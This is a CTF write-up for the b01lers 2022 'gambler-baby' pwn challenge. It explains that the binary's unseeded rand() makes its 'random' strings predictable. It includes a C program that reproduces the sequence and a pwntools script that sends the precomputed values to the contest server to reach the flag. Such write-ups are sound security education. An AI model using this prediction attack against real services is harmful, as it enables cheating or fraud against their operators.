---
title: "[Pwn] gambler-baby [Bo1lers CTF 2022]"
date: 2022-04-28 23:21:00
---

# 0x0 Introduction

Feeling lucky?

You must create a flag.txt in the same folder as the binary for it to run.
nc ctf.b01lers.com 9202

Author: robotearthpizza
Difficulty: Easy

files: [gambler_baby](gambler_baby)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

# 0x2 Vulnerability

function `sym.casino` ask for a 4 byte string using `fgets`, then it compare with a random string generate by `sym.imp.rand()`. 

If we enter the same string as the random one, we get certain amount of money. If we have more than 1000 in balance, the program will print out the flag

```
{
    do {
        // generate random string
        sym.imp.fgets(&s2, 5, _reloc.stdin);
        iVar1 = sym.imp.strcmp(&s1);
        // add or subtract balance depend on the result
    } while (_obj.balance < 1000);
    sym.give_flag();
    return;
}
```

The vulnerability here is that the binary never set random seed using `srand`, therefore, the sequence `rand()` give us will always be the same.

we can use following code to generate string and send string to the server

```
#include <stdlib.h>
#include <stdio.h>

int main () {
    char s[5];
    s[4] = '\x0';
    for (int j=0;j<200;j++) {
        for (int i=0;i<4;i++) {
            int x = rand();
            s[i] = x + (x / 0x1a) * -(0x1a) + 'a';
        }
        printf("\"%s\",",s);
    }
}
```


# 0x3 Exploit

```
from pwn import *

values = ["nwlr","bbmq","bhcd","arzo","wkky","hidd","qscd","xrjm","owfr","xsjy","bldb","efsa","rcby","necd","yggx","xpkl","orel","lnmp","apqf","wkho","pkmc","oqhn","wnku","ewhs","qmgb","buqc","ljji","vswm","dkqt","bxix","mvtr","rblj","ptns","nfwz","qfjm","afad","rrws","ofsb","cnuv","qhff","bsaq","xwpq","cace","hchz","vfrk","mlno","zjkp","qpxr","jxki","tzyx","acbh","hkic","qcoe","ndto","mfgd","wdwf","cgpx","iqvk","uytd","lcgd","ewht","acio","hord","tqkv","wcsg","spqo","qmsb","oagu","wnny","qxnz","lgdg","wpbt","rwbl","nsad","eugu","umoq","cdru","beto","kyxh","oach","wdvm","xxrd","ryxl","mndq","tukw","agml","ejuu","kwci","bxub","umen","meya","tdrm","ydia","jxlo","ghiq","fmzh","lvih","jouv","suyo","ypay","ulye","imuo","tehz","riic","fskp","ggkb","bipz","zrzu","cxam","ludf","ykgr","uowz","gioo","obpp","leql","wpha","pjna","dqhd","cnvw","dtxj","bmyp","ppha","uxns","pusg","dhii","xqmb","fjxj","cvud","jsuy","ibye","bmws","iqyo","ygyx","ymze","vypz","vjeg","ebeo","cfuf","tsxd","ixti","gsie","ehkc","hzdf","lilr","jqfn","xztq","rsvb","spky","hsen","bppk","qtpd","dbuo","tbbq","cwiv","rfxj","ujjd","dntg","eiqv","dgai","jvwc","yaub","wewp","jvyg","ehlj","xepb"]

io = connect("ctf.b01lers.com", 9202)
i = 0
try:
    while True:
        lp(io.sendlineafter(b"letters: ",values[i].encode()))
        i+=1
except:
    pass
print(io.recv())

io.interactive()
```

# 0x4 Flag

forgot